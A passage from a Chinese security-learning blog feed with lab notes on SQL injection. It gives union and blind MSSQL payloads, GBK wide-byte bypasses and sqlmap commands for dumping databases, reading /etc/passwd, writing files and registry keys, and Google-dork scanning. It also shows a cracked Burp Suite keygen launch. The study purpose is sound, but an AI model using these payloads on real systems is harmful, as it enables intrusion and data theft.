      <url>/2019/09/07/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>在win2008上搭建的 mssql-sqli-labs环境<br>目标：Lab1，判断为 ‘ 注入</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1。order by 3 确定有 3 列<br><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025435888.png" alt><br>2。</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; –</code></pre><p><strong>mssql数字和字符串不能一起使用</strong><br><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025600225.png" alt><br>3。查询版本</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,@@version --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025642305.png" alt><br>4。获database()名称</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,db_name()--</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025724663.png" alt><br>5。获取当前用户名</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025802728.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,system_user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025823400.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,current_user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025842366.png" alt></p><pre><code>获取服务器主机信息http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,@@servername  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025910932.png" alt><br>6。查询库名</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select count(schema_name) from information_schema.schemata)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025951185.png" alt></p><pre><code>然后依次导出http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 schema_name from information_schema.schemata where schema_name not in (&#39;dbo&#39;,&#39;db_accessadmin&#39;,&#39;db_backupoperator&#39;,&#39;db_datareader&#39;,&#39;db_datawriter&#39;,&#39;db_ddladmin&#39;,&#39;db_denydatareader&#39;,&#39;db_denydatawriter&#39;,&#39;db_owner&#39;,&#39;db_securityadmin&#39;,&#39;guest&#39;,&#39;INFORMATION_SCHEMA&#39;,&#39;sys&#39;))  --</code></pre><p>7。找表名</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables  )  -- </code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030312129.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables where table_name not in (&#39;emails&#39;)  )  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030335203.png" alt></p><pre><code>依次类推爆出四个表http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables where table_name not in (&#39;emails&#39;,&#39;uagents&#39;,&#39;referers&#39;,&#39;users&#39;)  )  --</code></pre><p>8。爆表中的列</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 column_name from information_schema.columns where table_name=&#39;emails&#39;)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030423979.png" alt></p><pre><code>依次爆出字段http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 column_name from information_schema.columns where column_name not in (&#39;id&#39;,&#39;email_id&#39;,&#39;uagent&#39;,&#39;ip_address&#39;,&#39;username&#39;,&#39;referer&#39;,&#39;password&#39;))  --</code></pre><p>9。以emails表为例</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1id from emails)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030535374.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 email_id from emails ) --</code></pre><h2 id="盲注查询version"><a href="#盲注查询version" class="headerlink" title="盲注查询version"></a>盲注查询version</h2><p>1。确定version()字符串长度</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 email_id from emails ) --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030706821.png" alt><br>2。取单个字符进行ASCII比较</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; and ascii(substring(@@version,1,1)) &gt; 76 –确定是77，M依次类推（简便的方式使用union查看单个ascii快速确定字符串http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,ascii(substring(@@version,1,1))  --）</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030754284.png" alt><br>最终确定version字符</p><pre><code>    Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第八周 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL宽字节注入，使用sqlmap注入</title>
      <link href="/2019/09/07/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/09/07/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="常见的三种编码方式"><a href="#常见的三种编码方式" class="headerlink" title="常见的三种编码方式"></a>常见的三种编码方式</h2><pre><code>UTF8  三个16进制组成一个汉字GBK   两个16进制组成一个汉字ASCII 一个16进制组成一个字符</code></pre><h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>和SQL注入原理类似，破坏原SQL语句，使用注释符修复或使用内联的方式，修改SQL语句，令原SQL语句执行修改后的SQL语句。</p><h2 id="根据URL编码和以上三种编码方式结合的注入"><a href="#根据URL编码和以上三种编码方式结合的注入" class="headerlink" title="根据URL编码和以上三种编码方式结合的注入"></a>根据URL编码和以上三种编码方式结合的注入</h2><pre><code>&#39;       %27&quot;       %22#       %23\       %5c  %       %25说明：为了 \ 在编码中有意义，在GBK编码中可以与 %df 或 %81 或 %ec 结合。但在UTF8中不幸没有</code></pre><p><strong>思路：</strong>通过对特殊字符进行编码方式绕过网站对SQL注入的防护。</p><h3 id="网站常用的URL进行处理的方式"><a href="#网站常用的URL进行处理的方式" class="headerlink" title="网站常用的URL进行处理的方式"></a>网站常用的URL进行处理的方式</h3><pre><code>    addslashes() 对URL输入的特殊字符处理，但存在宽字节注入漏洞    PDO连接数据库，在PHP5.3之前同样存在宽字节SQL注入漏洞    MySQL连接数据库，两种方式设置数据库编码：        1。使用 mysql_query(&#39;set names &quot;GBK&quot;&#39;);需要和mysql_real_escape_string()配合使用，才可以预防宽字节注入。        2。使用 mysql_query(&#39;set names &quot;GBK&quot;&#39;);和 mysql_real_escape_string()配合是不能预防宽字节注入的。    注意：php默认会对URL的参数进行一次转码。网站通常习惯使用 urldecode() 函数 将参数一次性转码转成原始数据。   </code></pre><p><strong>urldecode()和 rawurldecode() 区别在于 rawurldecode() 会将 + 进行转码</strong></p><h1 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h1><pre><code>    User-Agent：浏览器像服务器表明身份信息，识别客户端的操作环境信息    Cookie：辨别用过户的身份标识    X-Forwarded-For：建成XFF头，HTTP客户端的真实IP（关于注入：有些网站在记录访问者IP地址时，如果写入数据库，就可能存在注入漏洞）    Referer：浏览器向WEB服务器表明自己的来源连接    Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口</code></pre><h1 id="关于使用sqlmap的技巧"><a href="#关于使用sqlmap的技巧" class="headerlink" title="关于使用sqlmap的技巧"></a>关于使用sqlmap的技巧</h1><p>如果找到注入漏洞，在常规不能使用sqlmap进行注入的情况下，则通过抓包，在此漏洞的基础上创建该漏洞类型的SQL语句，嵌入到该漏洞中，连接sqlmap，用*指定注入点。可以多线程（–thread 上限是10个） 使用–technique “BEUSTQ”可以只进行该类型的注入，加快速度。</p><pre><code>    BEUSTQ的含义：        B：Boolean-based blind  布尔类型注入        E：Error-based  报错型注入        U：Union query-based  可联合查询注入        S：Stacked queries  多语句查询注入/堆叠注入        T：Time-based blind  基于时间的延迟注入        Q：Inline Queries  嵌套内联查询注入</code></pre><h1 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h1><h2 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>根据提供centos7的虚拟机，测试老司机开车网站的宽字节注入漏洞，同时可以通过sqlmap跑出数据</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1。抓包<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023614621.png" alt><br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023624340.png" alt><br>2。确定是 ‘ 款字符注入，编写payload 导入sqlmap 去掉文档中不必要的 *<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023645743.png" alt><br>3。使用sqlmap跑数据库信息</p><pre><code>sqlmap -r &quot;D：\1.txt&quot;  --dbs --thread 10执行（线程上限是：10）</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023744166.png" alt><br>4。指定漏洞爆破数据库<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023820318.png" alt><br>5。–dump数据</p><pre><code>sqlmap -r &quot;D：\1.txt&quot;   --thread 10 --technique B  -D test –dump</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023851717.png" alt></p><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>根据提供centos7-留言板的虚拟机，测试留言板系统登陆页面的请求头ip注入，同时可以通过sqlmap跑出数据。</p><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><p>1。根据提供centos7-留言板的虚拟机，测试留言板系统登陆页面的请求头ip注入，同时可以通过sqlmap跑出数据。<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907024120527.png" alt><br>2。使用sqlmap进行爆破</p><pre><code>Sqlmap确定漏洞sqlmap -r &quot;C:\Users\ROC\Desktop\1.txt&quot; --thread 10</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907024159131.png" alt></p><pre><code>sqlmap -r &quot;C:\Users\ROC\Desktop\1.txt&quot; --thread 10 --dbs</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907024217358.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第八周 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap的操作</title>
      <link href="/2019/09/01/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
      <url>/2019/09/01/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用的注意点"><a href="#sqlmap使用的注意点" class="headerlink" title="sqlmap使用的注意点"></a>sqlmap使用的注意点</h1><p>如果第一次失败后，记得删除用户缓存。因为sqlmap在注入时会自动读取用户缓存，如果不删除可能会影响结果</p><h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><pre><code>常用参数–current-user 操作系统用户–current-db     当前库名–dbs            所有库名–hostname    –users        数据库管理员–privileges   查看管理员权限–roles        查看数据库角色脱裤参数1.    –dump，-C，-T，-D，--start，--stop（部分脱裤）2.    –dump-all –exclude-sysdbs（直接脱裤）3.    –sql-query “select * from users” （自己的命令脱裤）4.    当数据库管理员比较安全，没法顺利脱裤，只能利用字典拆解表名列名    a)    –common-tables    --common-columns系统操作参数Sqlmap的系统操作a)    参数：    i.    –udf-inject    --shared-lib        编译共享库并上传实现UDF高级注入        1.    Linux：share object文件    windows：DLL文件    ii.    读文件：        1.    –file-read=”绝对路径”    iii.    写文件：        1.    –file-write=”需要写入的文件绝对路径”  --file-dest=”写入的路径”    iv.    Linux下        1.    –sql-shell        mysql的shell（本质上是对注入查询出来的数据建立的临时数据库，只能对原数据查询，不能增删该）        2.    –os-shell        Linux的上传得webshell连接后的一个可控shell，但不是系统shell        3.    –os-cmd    v.    Windows下        1.    –reg-read    （读注册表）        2.    –reg-add        （写注册表）        3.    –reg-del        （删注册表）        4.    –reg-key –reg-value –reg-data  --reg-type（注册表参数）</code></pre><h1 id="GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）"><a href="#GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）" class="headerlink" title="GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）"></a>GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）</h1><h2 id="注入查询"><a href="#注入查询" class="headerlink" title="注入查询"></a>注入查询</h2><pre><code>a)    –u 指定网页 –p 指定参数（注入位置）sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id根据英文提示进行选择即可注入测试后出现的结果</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071724246.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --current-user 查看当前用户</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071902948.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --current-db</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071914102.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –dbs</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071925996.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --hostname</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071938999.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –users</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071958609.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --privileges</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072010888.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –role</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072024847.png" alt></p><h2 id="脱裤"><a href="#脱裤" class="headerlink" title="脱裤"></a>脱裤</h2><p><strong>步骤：查库-〉查表-〉查数据</strong></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –dbs 查库，选择库名sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security –tables 查表</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072215644.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users –dump 查数据</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072235740.png" alt></p><pre><code>通过查询表格结构，选择性查询数据sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users –columns 查表格结构</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072253138.png" alt></p><pre><code>查单列数据sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users -C username –dump</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072306019.png" alt></p><pre><code>查多列数据sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users -C username,password –dump</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072323069.png" alt><br><strong>直接脱裤</strong></p><pre><code>直接脱裤sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --dump-all --exclude-sysdbs</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072347374.png" alt></p><pre><code>自己命令脱裤sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --sql-query &quot;select * from users&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072359515.png" alt></p><h3 id="对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）"><a href="#对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）" class="headerlink" title="对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）"></a>对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）</h3><h4 id="手动添加cookie"><a href="#手动添加cookie" class="headerlink" title="手动添加cookie"></a>手动添加cookie</h4><pre><code>i.    以DVWA为目标ii.    开始操作：    最好在 –u 后的url地址中添加 “” sqlmap -u &quot;http://192.168.1.106/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit&amp;user_token=cba280d6f9c6dc25364ee79146d10431#&quot; -p id</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072518260.png" alt><br>没有cookie所以导致失败<br>通过对地址添加cookie修正问题，或者直接BurpSuite抓包对文件进行读取发包方式<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072535503.png" alt></p><pre><code>获取cookie，添加到命令中sqlmap -u &quot;http://192.168.1.106/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=a68oeapobi0kid19n3fi3t02g3&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072548270.png" alt><br>可以脱裤操作</p><h4 id="抓包添加cookie"><a href="#抓包添加cookie" class="headerlink" title="抓包添加cookie"></a>抓包添加cookie</h4><p>使用BurpSuite抓包脱裤<br>1．    抓包将数据包保存到本地<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072655540.png" alt><br>2．    使用 –r 绝对路径进行操作        这种适合POST数据包和含有cookie的数据包<br>sqlmap -r “C:\Users\ROC\Desktop\a.txt” -p id<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072705574.png" alt><br>3．    脱裤操作一样<br>4．    注入时修改user-gent<br>sqlmap -r “C:\Users\ROC\Desktop\a.txt” -p id –user-agent “nihao”    –user-agent 内容可以自定义<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072715198.png" alt><br>5．    –data 通过发送设置数据    –method指定 post还是get方式发送数据<br>a)    使用POST的方式<br>sqlmap -r “C:\Users\ROC\Desktop\1.txt” -p search –method post –data “search=1234”<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072724410.png" alt><br>b)    使用GET的方式<br>sqlmap -r “C:\Users\ROC\Desktop\1.txt” -p search –method get –data “search=1234”<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072732666.png" alt></p><h2 id="系统操作"><a href="#系统操作" class="headerlink" title="系统操作"></a>系统操作</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code>sqlmap -u &quot;http://192.168.1.106/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=a68oeapobi0kid19n3fi3t02g3&quot; --file-read=&quot;/etc/passwd&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073025801.png" alt></p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><pre><code>sqlmap -r &quot;D:\a.txt&quot; --file-write=&quot;D:\1.txt&quot; --file-dest=&quot;/var/www/html/tmp/1,txt&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073050131.png" alt><br>权限不足<br>换个文件路径</p><pre><code>sqlmap -u &quot;http://192.168.100.88/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=fqc3ra2jpq8538vaa6idlbp2a5&quot; --file-write=&quot;D：\1.txt&quot; --file-dest=&quot;/tmp/1&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190902083025960.png" alt><br>写入成功<br>查看写入的内容</p><pre><code>sqlmap -u &quot;http://192.168.100.88/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=fqc3ra2jpq8538vaa6idlbp2a5&quot; --file-read=&quot;/tmp/1.txt&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190902083145229.png" alt></p><h3 id="系统操作（以添加注册表为例）"><a href="#系统操作（以添加注册表为例）" class="headerlink" title="系统操作（以添加注册表为例）"></a>系统操作（以添加注册表为例）</h3><pre><code>sqlmap -r &quot;C:\Users\ROC\Desktop\1.txt&quot; -p search --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073136105.png" alt></p><h3 id="执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）"><a href="#执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）" class="headerlink" title="执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）"></a>执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）</h3><h4 id="对抓取的数据包进行操作"><a href="#对抓取的数据包进行操作" class="headerlink" title="对抓取的数据包进行操作"></a>对抓取的数据包进行操作</h4><p>a)    进入sql-shell<br>sqlmap -r “C:\Users\ROC\Desktop\1.txt” -p search –sql-shell<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073317051.png" alt><br>只能执行查询语句，这个相当于数据库的副本，增删该都没有意义<br>Select * from users<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073328145.png" alt><br>b)    Sqlmap支持 –g 参数使用谷哥浏览器查询，只获取前100个结果<br>    i.    intex:<br>    ii.    inurl:<br>    iii.    intitle:<br>  eg：  sqlmap -g “inurl:&quot;.php?id=1&quot;“  就可以在google中搜索符合条件的前一百进行注入测试。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 第七周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows和Linux设置快捷方式</title>
      <link href="/2019/09/01/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"/>
      <url>/2019/09/01/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="批处理里的-echo-off、echo-off、-echo-off"><a href="#批处理里的-echo-off、echo-off、-echo-off" class="headerlink" title="批处理里的 @echo off、echo off、::echo off"></a>批处理里的 @echo off、echo off、::echo off</h1><p>1．@echo off</p><pre><code>@echo offecho 1111111111111111111echo 2222222222222222222echo 3333333333333333333echo endpause</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070543586.png" alt></p><pre><code>echo offecho 1111111111111111111echo 2222222222222222222echo 3333333333333333333echo endpause</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070605201.png" alt></p><pre><code>::echo offecho 1111111111111111111echo 2222222222222222222echo 3333333333333333333echo endpause</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070624510.png" alt></p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>@echo off 执行后，后面的语句均不显示<br>echo off  执行后，后面所有指令均不显示，但本条显示<br>::echo off批处理的注释</p><h1 id="批处理注意的点"><a href="#批处理注意的点" class="headerlink" title="批处理注意的点"></a>批处理注意的点</h1><p>$* 用来接收参数<br>doskey 用来设置参数</p><h2 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h2><p>设置burp的快捷启动方式</p><pre><code>doskey sqlmap=C:\Python27\python.exe E:\WebTool\PyScript\sqlmap\sqlmap.py $*burp使用启动器上的命令，加上绝对路径即可</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070945538.png" alt></p><pre><code>doskey burp=java -Xbootclasspath/p:E:\WebTool\burp\burp-loader-keygen.jar -jar E:\WebTool\burp\burpsuite_pro_v2.0beta.jar</code></pre><p>设置sqlmap执行快捷键</p><pre><code>doskey sqlmap=C:\Python27\python.exe E:\WebTool\PyScript\sqlmap\sqlmap.py $*</code></pre><h1 id="写入到注册表"><a href="#写入到注册表" class="headerlink" title="写入到注册表"></a>写入到注册表</h1><p><strong>如果不写入到注册表，只能在执行该批处理后的当前命令行中执行操作</strong><br>添加到注册表 regedit<br>相关文件下没有的话新建一项，名字无所谓<br><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901071321262.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第七周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入 预防</title>
      <link href="/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E9%A2%84%E9%98%B2/"/>
      <url>/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E9%A2%84%E9%98%B2/</url>
      
